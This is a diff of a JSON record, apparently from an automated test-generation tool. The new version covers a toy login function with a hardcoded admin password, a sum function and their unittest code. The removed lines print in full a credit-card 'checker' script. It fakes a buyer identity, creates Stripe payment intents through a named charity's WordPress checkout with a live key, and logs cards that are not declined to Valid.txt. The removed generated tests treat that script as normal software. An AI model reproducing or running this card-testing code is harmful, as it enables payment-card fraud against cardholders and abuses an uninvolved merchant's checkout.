@@ -1,6 +1,6 @@
 {
-    "repo_url": "https://github.com/MarvoBG/CC-Checker",
-    "summary": "Repository: MarvoBG/CC-Checker\nFiles analyzed: 34\n\nEstimated tokens: 10.5k",
+    "repo_url": "https://github.com/sondosmm/testing",
+    "summary": "Repository: sondosmm/testing\nFiles analyzed: 31\n\nEstimated tokens: 8.8k",
     "frameworks_and_languages": {
         "languages": [
             "Python"
@@ -9,84 +9,130 @@
     },
     "modules_need_testing": [
         {
-            "id": "aed52645-9ff3-4d05-8e5d-d66aeeb5c774",
-            "path": "/Checker.py",
-            "name": "funct",
+            "id": "7a324a02-1c4f-4f9d-b5ce-a9a40343bd37",
+            "path": "testing.py",
+            "name": "login",
             "type": "function",
-            "code": "def funct(cc,mm,yy,cvv):\n print('[======> '+cc+' <======]')\n print('[+] Step 1 : Started ....')\n head1={\n 'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',\n 'Pragma':'no-cache',\n 'Accept':'*/*',\n }\n response1 = requests.get('https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US',headers=head1).json()\n for x in response1['results']:\n  print('[*] Grab Random Info')\n  name=x['name']['first']\n  second=x['name']['last']\n email=(name+second+'@outlook.com').lower()\n fullname=name+' '+second\n print('[-] first Name : '+name)\n print('[-] last Name : '+second)\n print('[-] Full Name : '+fullname)\n print('[-] email : '+email)\n print('[*] Successfully Grabbed :)')\n print('[+] Step 2 : Started ....')\n cookies2 = {'content-type':'application/x-www-form-urlencoded',}\n Guid=str(requests.post('https://m.stripe.com/4',headers=head1,cookies=cookies2).text)\n Muid=str(uuid.uuid1())\n Sid=str(uuid.uuid1())\n print('[-] Guid : '+Guid)\n print('[-] Muid : '+Muid)\n print('[-] Sid : '+Sid)\n print('[*] Successfully generated :)')\n print('[+] Step 3 : Started ....')\n cookies3 = {\n 'content-type':'application/x-www-form-urlencoded',\n 'user-agent':'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',\n }\n data3={\n 'action': 'asp_pp_req_token',\n 'amount': '100',\n 'curr': 'USD',\n 'product_id': '330',\n 'quantity': '1',\n 'billing_details': {'name':str(fullname),'email':str(email)},\n } \n response3 = requests.post('https://elevatedbygrace.org/wp-admin/admin-ajax.php',data=data3,cookies=cookies3)\n amir=response3.json()\n client=str(amir['clientSecret'])\n pid=str(amir['pi_id'])\n print('[-] clientSecret : '+client)\n print('[-] pi_id : '+pid)\n print('[*] Successfully Grabbed :)')\n print('[+] Step 4 : Started ....')\n data4={\n 'save_payment_method':'true',\n 'setup_future_usage':'off_session',\n 'payment_method_data[type]':'card',\n 'payment_method_data[billing_details][name]':fullname,\n 'payment_method_data[billing_details][email]':email,\n 'payment_method_data[card][number]':str(cc),\n 'payment_method_data[card][cvc]':str(cvv),\n 'payment_method_data[card][exp_month]':str(mm),\n 'payment_method_data[card][exp_year]':str(yy),\n 'payment_method_data[guid]':Guid,\n  'payment_method_data[muid]':Muid,\n 'payment_method_data[sid]':Sid,\n 'payment_method_data[pasted_fields]':'number',\n 'payment_method_data[payment_user_agent]':'stripe.js%2F3c236fed%3B+stripe-js-v3%2F3c236fed',\n 'payment_method_data[time_on_page]':'40371',\n 'payment_method_data[referrer]':'https%3A%2F%2Felevatedbygrace.org%2F%3Fasp_action%3Dshow_pp%26product_id%3D330',\n 'expected_payment_method_type':'card',\n 'use_stripe_sdk':'true',\n 'key':'pk_live_Alme0DgBmyGhR4EGURpxR0Xy',\n 'client_secret':client,\n }\n cookies4 = {\n 'content-type':'application/x-www-form-urlencoded',\n }\n head4={\n 'accept': 'application/json',\n 'accept-encoding': 'gzip, deflate, br',\n 'accept-language': 'en-US,en;q=0.9',\n 'content-length': '1012',\n 'content-type': 'application/x-www-form-urlencoded',\n 'origin': 'https://js.stripe.com',\n 'referer': 'https://js.stripe.com/v3/controller-52375fd2df5c19565f60d66a345a1bff.html',\n 'sec-fetch-dest': 'empty',\n 'sec-fetch-mode': 'cors',\n 'sec-fetch-site': 'same-site',\n 'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36',\n }\n response4 = requests.post('https://api.stripe.com/v1/payment_intents/'+pid+'/confirm',data=data4,headers=head4,cookies=cookies4).json()\n if response4['error']['message'] in ['Your card was declined.','Your card has expired.']:\n  print('[-] Result = '+response4['error']['message'])\n  print('[-] Reason = '+response4['error']['decline_code'])\n else:\n  print('[+] '+str(cc)+' Valid')\n  open('Valid.txt','a+').write(str(cc)+'|'+mm+'|'+yy+'|'+cvv+'\\n')\n"
+            "code": "def login(username, password):\n    \"\"\"\n    Simulates a login function.\n\n    Args:\n        username (str): The username for login.\n        password (str): The password for login.\n\n    Returns:\n        str: Success or failure message.\n    \"\"\"\n    if username == \"admin\" and password == \"password123\":\n        return \"Login successful!\"\n    return \"Invalid username or password.\""
         },
         {
-            "id": "be9ea841-09cf-47cc-9be5-5eca6c7219e0",
-            "path": "/Checker.py",
-            "name": "type",
+            "id": "607307b3-bf6f-4496-af9f-d68d59257edd",
+            "path": "testing.py",
+            "name": "sum_two_values",
             "type": "function",
-            "code": "def type(param):\n    print(type(param))"
+            "code": "def sum_two_values(a, b):\n    \"\"\"\n    Returns the sum of two values.\n\n    Args:\n        a (int or float): The first value.\n        b (int or float): The second value.\n\n    Returns:\n        int or float: The sum of the two values.\n    \"\"\"\n    return a + b"
         }
     ],
     "test_cases": [
         {
-            "function": "funct",
-            "function_id": "05c0ea52-80ac-400a-b54c-9138da76c9e6",
+            "function": "login",
+            "function_id": "f7d7e3a1-4b3a-4c7b-bf7d-1c4f3e2d8f1a",
             "test_cases": [
                 {
-                    "test_case_id": "1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6",
-                    "test_name": "Positive Test Case 1",
-                    "description": "Testing the function with valid input data.",
+                    "test_case_id": "1",
+                    "test_name": "test_login_valid_credentials",
+                    "description": "Test login with valid username and password.",
                     "test_data": {
-                        "cc": "1234567890123456",
-                        "mm": "12",
-                        "yy": "2023",
-                        "cvv": "123"
+                        "username": "admin",
+                        "password": "password123"
                     },
-                    "expected_output": "Valid.txt file should be updated with the provided credit card information."
+                    "expected_output": "Login successful!"
                 },
                 {
-                    "test_case_id": "2b3c4d5e-6f7a-8b9c-0d1e-2f3a4b5c6d7",
-                    "test_name": "Negative Test Case 1",
-                    "description": "Testing the function with invalid credit card number.",
+                    "test_case_id": "2",
+                    "test_name": "test_login_invalid_username",
+                    "description": "Test login with invalid username.",
                     "test_data": {
-                        "cc": "invalid",
-                        "mm": "12",
-                        "yy": "2023",
-                        "cvv": "123"
+                        "username": "user123",
+                        "password": "password123"
                     },
-                    "expected_output": "Error message should be displayed for invalid credit card number."
+                    "expected_output": "Invalid username or password."
                 },
                 {
-                    "test_case_id": "3c4d5e6f-7a8b9c0d-1e2f3a4b5c6",
-                    "test_name": "Negative Test Case 2",
-                    "description": "Testing the function with expired credit card.",
+                    "test_case_id": "3",
+                    "test_name": "test_login_invalid_password",
+                    "description": "Test login with invalid password.",
                     "test_data": {
-                        "cc": "1234567890123456",
-                        "mm": "12",
-                        "yy": "2020",
-                        "cvv": "123"
+                        "username": "admin",
+                        "password": "pass123"
                     },
-                    "expected_output": "Error message should be displayed for expired credit card."
+                    "expected_output": "Invalid username or password."
+                },
+                {
+                    "test_case_id": "4",
+                    "test_name": "test_login_invalid_credentials",
+                    "description": "Test login with both invalid username and password.",
+                    "test_data": {
+                        "username": "user123",
+                        "password": "pass123"
+                    },
+                    "expected_output": "Invalid username or password."
                 }
             ],
-            "test_case_id": "65fd4c75-eb2b-40a9-bfef-4703feaf0b82"
+            "test_case_id": "0148baf4-aa8b-4df6-b57e-d4ac5be34cbc"
         },
         {
-            "function": "type",
-            "function_id": "e9012bbd-1176-49ad-b418-b723bc1c7cc6",
+            "function": "sum_two_values",
+            "function_id": "f7d7e3a1-4b3a-4c7d-bf7a-1c4f3e2d8f1a",
             "test_cases": [
                 {
-                    "test_case_id": "1a2b3c4d-5e6f-7a8b-9c0d1e2f3a4b",
-                    "test_name": "positive_test_case",
-                    "description": "Test the function with a valid input parameter.",
-                    "test_data": "5",
-                    "expected_output": "<class 'int'>"
+                    "test_case_id": "1",
+                    "test_name": "test_add_positive_numbers",
+                    "description": "Test adding two positive numbers",
+                    "test_data": {
+                        "a": 5,
+                        "b": 3
+                    },
+                    "expected_output": 8
                 },
                 {
-                    "test_case_id": "5a4b3c2d-1e0f-9a8b-7c6d-5e4f3a2b1c0d",
-                    "test_name": "negative_test_case",
-                    "description": "Test the function with an invalid input parameter.",
-                    "test_data": "hello",
-                    "expected_output": "<class 'str'>"
+                    "test_case_id": "2",
+                    "test_name": "test_add_negative_numbers",
+                    "description": "Test adding a negative and a positive number",
+                    "test_data": {
+                        "a": -2,
+                        "b": 7
+                    },
+                    "expected_output": 5
+                },
+                {
+                    "test_case_id": "3",
+                    "test_name": "test_add_zero",
+                    "description": "Test adding zero to a number",
+                    "test_data": {
+                        "a": 10,
+                        "b": 0
+                    },
+                    "expected_output": 10
+                },
+                {
+                    "test_case_id": "4",
+                    "test_name": "test_add_float_numbers",
+                    "description": "Test adding two float numbers",
+                    "test_data": {
+                        "a": 3.5,
+                        "b": 2.5
+                    },
+                    "expected_output": 6.0
                 }
             ],
-            "test_case_id": "213c4824-951e-470a-88a4-8892f8404d15"
+            "test_case_id": "69e6f362-bf5d-46e3-869d-ace2e4e9dc83"
+        }
+    ],
+    "test_code": [
+        {
+            "unit_test_code": "import unittest\nfrom your_module import login\n\nclass TestLogin(unittest.TestCase):\n    def test_login_valid_credentials(self):\n        result = login('admin', 'password123')\n        self.assertEqual(result, 'Login successful!')\n\n    def test_login_invalid_username(self):\n        result = login('user123', 'password123')\n        self.assertEqual(result, 'Invalid username or password.')\n\n    def test_login_invalid_password(self):\n        result = login('admin', 'pass123')\n        self.assertEqual(result, 'Invalid username or password.')\n\n    def test_login_invalid_credentials(self):\n        result = login('user123', 'pass123')\n        self.assertEqual(result, 'Invalid username or password.')",
+            "test_library": "unittest",
+            "name_unit_test_file": "test_login.py",
+            "unit_test_id": "bba4f795-3dd8-47ab-96bc-c694902e993c",
+            "id": "2dffa549-83fc-4853-9234-736730441fe7"
+        },
+        {
+            "unit_test_code": "import unittest\nfrom your_module import sum_two_values\n\nclass TestSumTwoValues(unittest.TestCase):\n    def test_add_positive_numbers(self):\n        self.assertEqual(sum_two_values(5, 3), 8)\n\n    def test_add_negative_numbers(self):\n        self.assertEqual(sum_two_values(-2, 7), 5)\n\n    def test_add_zero(self):\n        self.assertEqual(sum_two_values(10, 0), 10)\n\n    def test_add_float_numbers(self):\n        self.assertEqual(sum_two_values(3.5, 2.5), 6.0)\n",
+            "test_library": "unittest",
+            "name_unit_test_file": "test_sum_two_values.py",
+            "unit_test_id": "985fc85c-f9a6-4153-a97f-6c07fd17f5f4",
+            "id": "90286c63-5a93-4caa-8786-e7fefec7e894"
         }
     ]
 }
